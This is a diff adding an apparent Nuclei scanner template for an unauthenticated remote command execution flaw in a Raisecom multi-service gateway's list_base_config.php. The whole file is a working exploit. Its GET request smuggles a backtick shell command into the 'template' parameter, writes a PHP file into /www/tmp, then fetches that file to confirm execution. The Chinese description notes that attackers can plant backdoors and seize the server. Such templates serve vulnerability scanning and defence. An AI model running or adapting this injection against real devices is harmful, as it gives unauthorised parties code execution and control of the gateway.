@@ -1,0 +1,23 @@
+id: rskd-vpn-config-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 瑞斯康达-多业务智能网关 list_base_config.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE-%E5%A4%9A%E4%B8%9A%E5%8A%A1%E6%99%BA%E8%83%BD%E7%BD%91%E5%85%B3-RCE.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{filename}}.php%60"
+      - "{{BaseURL}}/tmp/{{filename}}.php"
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PHP Version'
